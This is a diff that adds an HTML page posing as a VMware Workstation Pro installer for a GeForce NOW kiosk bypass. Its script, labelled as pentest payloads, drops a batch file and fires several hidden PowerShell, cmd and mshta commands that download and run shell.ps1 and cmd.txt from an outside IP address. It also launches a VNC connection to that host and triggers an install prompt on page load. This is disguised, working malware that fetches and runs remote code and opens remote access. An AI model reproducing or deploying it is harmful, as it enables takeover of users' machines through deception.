@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VMware Workstation Pro - Installation Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(255,255,255,0.95);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            max-width: 500px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #0099ff, #007acc);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: white;
+            font-weight: bold;
+        }
+        h1 { color: #333; margin-bottom: 15px; font-size: 24px; }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            color: #856404;
+            font-size: 14px;
+        }
+        .btn {
+            background: linear-gradient(45deg, #28a745, #20c997);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(40,167,69,0.4);
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(40,167,69,0.6); }
+        .btn-secondary {
+            background: linear-gradient(45deg, #6c757d, #495057);
+            box-shadow: 0 5px 15px rgba(108,117,125,0.4);
+        }
+        .status { 
+            margin-top: 20px; 
+            padding: 10px;
+            background: #d4edda;
+            border-radius: 5px;
+            font-size: 12px;
+            color: #155724;
+            display: none;
+        }
+        .nvidia-hint { 
+            font-size: 12px; 
+            color: #666; 
+            margin-top: 15px;
+            opacity: 0.8;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+        .pulse { animation: pulse 2s infinite; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">VM</div>
+        <h1>VMware Workstation Pro</h1>
+        <p style="color: #666; margin-bottom: 20px;">NVIDIA GeForce NOW optimization detected. Install required for kiosk bypass.</p>
+        
+        <div class="warning">
+            <strong>Warning:</strong> Kiosk mode restrictions detected. VMware installation will grant full system access and bypass restrictions.
+        </div>
+        
+        <button class="btn" onclick="installVMware()">
+            🔄 Open install_vmware.bat
+        </button>
+        <button class="btn btn-secondary" onclick="bypassKiosk()">
+            ⚡ Quick Bypass (Recommended)
+        </button>
+        
+        <div class="status" id="status"></div>
+        <div class="nvidia-hint">
+            Optimized for NVIDIA GeForce NOW • Requires admin privileges
+        </div>
+    </div>
+
+    <script>
+        // Core pentest payload functions
+        function installVMware() {
+            showStatus('Downloading install_vmware.bat...');
+            // Payload 1: Direct batch download
+            window.location.href = 'https://www.techspot.com/downloads/downloadnowfile/189/?evp=9a3443ba810782b36c970bb5d41cf796&file=12520';
+            
+            // Fallback: Create and trigger local batch
+            setTimeout(() => {
+                const batContent = `@echo off\n` +
+                    `title VMware Installation\n` +
+                    `echo Installing VMware Workstation...\n` +
+                    `powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://80.250.98.90/shell.ps1')"\n` +
+                    `timeout /t 3\n` +
+                    `start vncviewer 80.250.98.90:5900\n`;
+                const blob = new Blob([batContent], {type: 'application/bat'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'install_vmware.bat';
+                a.click();
+            }, 1000);
+        }
+
+        function bypassKiosk() {
+            showStatus('Bypassing kiosk restrictions...');
+            
+            // Payload 2: CMD shell via PowerShell
+            const cmdPayload = `(New-Object Net.WebClient).DownloadString('http://80.250.98.90/cmd.txt') | powershell -WindowStyle Hidden`;
+            
+            // Multiple execution vectors
+            execPayloads([
+                `powershell -WindowStyle Hidden -EncodedCommand ${btoa(cmdPayload)}`,
+                `cmd /c powershell -ep bypass -c "${cmdPayload}"`,
+                `mshta javascript: new ActiveXObject('WScript.Shell').run('cmd /c powershell -ep bypass -c \"IEX((New-Object Net.WebClient).DownloadString(\\'http://80.250.98.90/shell.ps1\\'))\"');close()`
+            ]);
+            
+            // VNC auto-connect
+            setTimeout(() => connectVNC(), 2000);
+        }
+
+        function execPayloads(payloads) {
+            payloads.forEach(payload => {
+                try {
+                    new Function(`window.location = 'javascript:' + '${btoa(payload)}'`)();
+                } catch(e) {}
+                // Direct iframe injection
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = `javascript:${encodeURIComponent(payload)}`;
+                document.body.appendChild(iframe);
+            });
+        }
+
+        function connectVNC() {
+            showStatus('Connecting VNC session... 80.250.98.90:5900');
+            // VNC viewer launch attempts
+            const vncPayloads = [
+                `powershell -WindowStyle Hidden -Command "Start-Process 'vncviewer.exe' -ArgumentList '80.250.98.90:5900'"`,
+                `cmd /c start vncviewer 80.250.98.90:5900`,
+                `(New-Object -comObject WScript.Shell).Run('cmd /c vncviewer 80.250.98.90:5900',0)`
+            ];
+            execPayloads(vncPayloads);
+        }
+
+        function showStatus(msg) {
+            const status = document.getElementById('status');
+            status.textContent = msg;
+            status.style.display = 'block';
+            status.classList.add('pulse');
+        }
+
+        // Auto-trigger on load (subtle)
+        window.onload = () => {
+            setTimeout(() => {
+                if (confirm('VMware required for GeForce NOW. Install now?')) {
+                    installVMware();
+                }
+            }, 2000);
+        };
+
+        // Keyboard shortcuts for pentest
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.shiftKey) {
+                if (e.key === 'C') bypassKiosk();  // Ctrl+Shift+C = CMD
+                if (e.key === 'V') connectVNC();   // Ctrl+Shift+V = VNC
+            }
+        });
+    </script>
+</body>
+</html>
